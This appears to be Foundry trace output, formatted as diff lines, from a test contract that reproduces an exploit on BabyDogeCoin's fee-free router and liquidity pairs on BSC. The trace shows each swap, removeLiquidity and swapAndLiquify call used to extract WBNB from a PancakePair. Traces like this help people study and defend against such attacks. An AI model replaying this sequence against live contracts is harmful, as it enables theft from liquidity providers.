+    │   │   │   │   │   ├─ [111720] BabyDogeCoin::transfer(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 13190079457 [1.319e10])
+    │   │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 13190079457 [1.319e10])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 30766481211537003358366 [3.076e22]
+    │   │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 5121478326926915116221834 [5.121e24]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 30766481211537003358366 [3.076e22], reserve1: 5121478326926915116221834 [5.121e24])
+    │   │   │   │   │   ├─ emit Burn(sender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], amount0: 79237342 [7.923e7], amount1: 13190079457 [1.319e10], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e])
+    │   │   │   │   │   └─ ← [Return] 79237342 [7.923e7], 13190079457 [1.319e10]
+    │   │   │   │   └─ ← [Return] 13190079457 [1.319e10], 79237342 [7.923e7]
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 7351566846761747005480 [7.351e21]
+    │   │   │   ├─ [111654] BabyDogeCoin::transfer(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], 7351566846761747005480 [7.351e21])
+    │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], value: 7351566846761747005480 [7.351e21])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WBNB::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 79237342 [7.923e7]
+    │   │   │   ├─ [8062] WBNB::transfer(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], 79237342 [7.923e7])
+    │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], value: 79237342 [7.923e7])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit LiquidityRemoved(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], param2: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], param3: 13190079457 [1.319e10], param4: 79237342 [7.923e7], param5: 1000000000 [1e9])
+    │   │   │   └─ ← [Return] 13190079457 [1.319e10], 79237342 [7.923e7]
+    │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 99419194216849103139277 [9.941e22]
+    │   │   ├─ [22320] WBNB::approve(BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], 99419194216849103139277 [9.941e22])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], value: 99419194216849103139277 [9.941e22])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 99419194216849103139277 [9.941e22]
+    │   │   ├─ [260520] BabyDogeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(99419194216849103139277 [9.941e22], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xc748673057861a797275CD8A068AbB95A902e8de], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1687350211 [1.687e9])
+    │   │   │   ├─ [4148] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 99419194216849103139277 [9.941e22])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 99419194216849103139277 [9.941e22])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [540] BabyDogeRouterPair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 30766481211537003358366 [3.076e22], 5121478326926915116221834 [5.121e24], 1687350211 [1.687e9]
+    │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 130185675428386106497643 [1.301e23]
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 10000000000000 [1e13]
+    │   │   │   ├─ [145025] BabyDogeRouterPair::swap(0, 3911131134717058085687142 [3.911e24], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 0x)
+    │   │   │   │   ├─ [131620] BabyDogeCoin::transfer(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 3911131134717058085687142 [3.911e24])
+    │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 3911131134717058085687142 [3.911e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 130185675428386106497643 [1.301e23]
+    │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1210347192209857030534692 [1.21e24]
+    │   │   │   │   ├─ emit Sync(reserve0: 130185675428386106497643 [1.301e23], reserve1: 1210347192209857030534692 [1.21e24])
+    │   │   │   │   ├─ emit Swap(sender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], amount0In: 99419194216849103139277 [9.941e22], amount1In: 0, amount0Out: 0, amount1Out: 3911131134717058085687142 [3.911e24], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3911131134717058085687142 [3.911e24]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [393547] FeeFreeRouter::removeLiquidity(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 1000000000 [1e9], 0, 0, PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], 1687350211 [1.687e9])
+    │   │   │   ├─ [644] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::getPair(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   └─ ← [Return] BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]
+    │   │   │   ├─ [24002] BabyDogeRouterPair::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1000000000 [1e9])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 1000000000 [1e9])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [583] BabyDogeRouterPair::allowance(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47]) [staticcall]
+    │   │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    │   │   │   ├─ [199793] BabyDogeRouter::removeLiquidity(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 1000000000 [1e9], 0, 0, FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 1687350211 [1.687e9])
+    │   │   │   │   ├─ [23399] BabyDogeRouterPair::transferFrom(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], 1000000000 [1e9])
+    │   │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], value: 1000000000 [1e9])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [173903] BabyDogeRouterPair::burn(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e])
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 130185675428386106497643 [1.301e23]
+    │   │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1210347192209857030534692 [1.21e24]
+    │   │   │   │   │   ├─ [338] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::feeTo() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x1551EAC5D2EDAa634f713A526866Ad83b82b5209
+    │   │   │   │   │   ├─ [381] 0x4693B62E5fc9c0a45F89D62e6300a03C85f43137::feeToTreasury() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000001551eac5d2edaa634f713a526866ad83b82b5209
+    │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: 0x0000000000000000000000000000000000000000, value: 1000000000 [1e9])
+    │   │   │   │   │   ├─ [23162] WBNB::transfer(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 335285886 [3.352e8])
+    │   │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 335285886 [3.352e8])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [111720] BabyDogeCoin::transfer(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], 3117181137 [3.117e9])
+    │   │   │   │   │   │   ├─ emit Transfer(from: BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], value: 3117181137 [3.117e9])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 130185675428385771211757 [1.301e23]
+    │   │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(BabyDogeRouterPair: [0x0536c8b0c3685b6e3C62A7b5c4E8b83f938f12D1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1210347192209853913353555 [1.21e24]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 130185675428385771211757 [1.301e23], reserve1: 1210347192209853913353555 [1.21e24])
+    │   │   │   │   │   ├─ emit Burn(sender: BabyDogeRouter: [0xC9a0F685F39d05D835c369036251ee3aEaaF3c47], amount0: 335285886 [3.352e8], amount1: 3117181137 [3.117e9], to: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e])
+    │   │   │   │   │   └─ ← [Return] 335285886 [3.352e8], 3117181137 [3.117e9]
+    │   │   │   │   └─ ← [Return] 3117181137 [3.117e9], 335285886 [3.352e8]
+    │   │   │   ├─ [32602] BabyDogeCoin::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 3911131134717061202868279 [3.911e24]
+    │   │   │   ├─ [119274] BabyDogeCoin::transfer(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], 3911131134717061202868279 [3.911e24])
+    │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], value: 3911131134717061202868279 [3.911e24])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WBNB::balanceOf(FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e]) [staticcall]
+    │   │   │   │   └─ ← [Return] 335285886 [3.352e8]
+    │   │   │   ├─ [8062] WBNB::transfer(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], 335285886 [3.352e8])
+    │   │   │   │   ├─ emit Transfer(from: FeeFreeRouter: [0x9869674E80D632F93c338bd398408273D20a6C8e], to: PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], value: 335285886 [3.352e8])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit LiquidityRemoved(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], param2: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], param3: 3117181137 [3.117e9], param4: 335285886 [3.352e8], param5: 1000000000 [1e9])
+    │   │   │   └─ ← [Return] 3117181137 [3.117e9], 335285886 [3.352e8]
+    │   │   ├─ [24608] BabyDogeCoin::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1)
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1)
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [181894] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(1, 1, [0xc748673057861a797275CD8A068AbB95A902e8de, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1687350211 [1.687e9])
+    │   │   │   ├─ [109748] BabyDogeCoin::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], 1)
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], value: 1)
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [2893] PancakePair::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 28046549880102720166192 [2.804e22], 4730513927540743416049435 [4.73e24], 1687350028 [1.687e9]
+    │   │   │   ├─ [744] BabyDogeCoin::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   └─ ← [Return] 8641645062257804618917715 [8.641e24]
+    │   │   │   ├─ [57749] PancakePair::swap(12676226029635003986492 [1.267e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [23162] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12676226029635003986492 [1.267e22])
+    │   │   │   │   │   ├─ emit Transfer(from: PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 12676226029635003986492 [1.267e22])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 15370323850468051465586 [1.537e22]
+    │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 8641645062257804618917715 [8.641e24]
+    │   │   │   │   ├─ emit Sync(reserve0: 15370323850468051465586 [1.537e22], reserve1: 8641645062257804618917715 [8.641e24])
+    │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 335285886 [3.352e8], amount1In: 3911131134717061202868280 [3.911e24], amount0Out: 12676226029635003986492 [1.267e22], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 12676226029635003986492 [1.267e22]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [32602] BabyDogeCoin::balanceOf(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de]) [staticcall]
+    │   │   │   └─ ← [Return] 209999999999013190079546 [2.099e23]
+    │   │   ├─ [431] BabyDogeCoin::numTokensSellToAddToLiquidity() [staticcall]
+    │   │   │   └─ ← [Return] 210000000000000000000000 [2.1e23]
+    │   │   ├─ [113852] BabyDogeCoin::transfer(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], 986809920454 [9.868e11])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], value: 986809920454 [9.868e11])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [577231] BabyDogeCoin::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
+    │   │   │   ├─ [275] Router::WETH() [staticcall]
+    │   │   │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
+    │   │   │   ├─ emit Approval(owner: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 105000000000000000000000 [1.05e23])
+    │   │   │   ├─ [180605] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(105000000000000000000000 [1.05e23], 0, [0xc748673057861a797275CD8A068AbB95A902e8de, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], 1687350211 [1.687e9])
+    │   │   │   │   ├─ [114501] BabyDogeCoin::transferFrom(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], 105000000000000000000000 [1.05e23])
+    │   │   │   │   │   ├─ emit Transfer(from: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], to: PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], value: 105000000000000000000000 [1.05e23])
+    │   │   │   │   │   ├─ emit Approval(owner: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [893] PancakePair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 15370323850468051465586 [1.537e22], 8641645062257804618917715 [8.641e24], 1687350211 [1.687e9]
+    │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 8746645062257804618917715 [8.746e24]
+    │   │   │   │   ├─ [40468] PancakePair::swap(184058870376329453932 [1.84e20], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   │   │   ├─ [25162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 184058870376329453932 [1.84e20])
+    │   │   │   │   │   │   ├─ emit Transfer(from: PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 184058870376329453932 [1.84e20])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 15186264980091722011654 [1.518e22]
+    │   │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 8746645062257804618917715 [8.746e24]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 15186264980091722011654 [1.518e22], reserve1: 8746645062257804618917715 [8.746e24])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 105000000000000000000000 [1.05e23], amount0Out: 184058870376329453932 [1.84e20], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 184058870376329453932 [1.84e20]
+    │   │   │   │   ├─ [9223] WBNB::withdraw(184058870376329453932 [1.84e20])
+    │   │   │   │   │   ├─ [83] Router::fallback{value: 184058870376329453932}()
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 184058870376329453932 [1.84e20])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [55] BabyDogeCoin::fallback{value: 184058870376329453932}()
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ emit Approval(owner: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 105000000000000000000000 [1.05e23])
+    │   │   │   ├─ [228293] Router::addLiquidityETH{value: 184058870376329453932}(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], 105000000000000000000000 [1.05e23], 0, 0, 0x505d1180061727c59Ce04E7acfc117283CF797F0, 1687350211 [1.687e9])
+    │   │   │   │   ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]
+    │   │   │   │   ├─ [893] PancakePair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 15186264980091722011654 [1.518e22], 8746645062257804618917715 [8.746e24], 1687350211 [1.687e9]
+    │   │   │   │   ├─ [114387] BabyDogeCoin::transferFrom(BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], 105000000000000000000000 [1.05e23])
+    │   │   │   │   │   ├─ emit Transfer(from: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], to: PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], value: 105000000000000000000000 [1.05e23])
+    │   │   │   │   │   ├─ emit Approval(owner: BabyDogeCoin: [0xc748673057861a797275CD8A068AbB95A902e8de], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [21974] WBNB::deposit{value: 182305079440141539344}()
+    │   │   │   │   │   ├─ emit Deposit(dst: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 182305079440141539344 [1.823e20])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [3262] WBNB::transfer(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], 182305079440141539344 [1.823e20])
+    │   │   │   │   │   ├─ emit Transfer(from: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0], value: 182305079440141539344 [1.823e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [62209] PancakePair::mint(0x505d1180061727c59Ce04E7acfc117283CF797F0)
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 15368570059531863550998 [1.536e22]
+    │   │   │   │   │   ├─ [744] BabyDogeCoin::balanceOf(PancakePair: [0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 8851645062257804618917715 [8.851e24]
+    │   │   │   │   │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 82393291510072432534 [8.239e19])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x505d1180061727c59Ce04E7acfc117283CF797F0, value: 3714886719714572147607 [3.714e21])
+    │   │   │   │   │   ├─ emit Sync(reserve0: 15368570059531863550998 [1.536e22], reserve1: 8851645062257804618917715 [8.851e24])
+    │   │   │   │   │   ├─ emit Mint(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 182305079440141539344 [1.823e20], amount1: 105000000000000000000000 [1.05e23])
+    │   │   │   │   │   └─ ← [Return] 3714886719714572147607 [3.714e21]
+    │   │   │   │   ├─ [55] BabyDogeCoin::fallback{value: 1753790936187914588}()
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   └─ ← [Return] 105000000000000000000000 [1.05e23], 182305079440141539344 [1.823e20], 3714886719714572147607 [3.714e21]
+    │   │   │   ├─ emit SwapAndLiquify(: 105000000000000000000000 [1.05e23], : 184058870376329453932 [1.84e20], : 105000000000000000000000 [1.05e23])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1)
+    │   │   │   └─ ← [Return] true
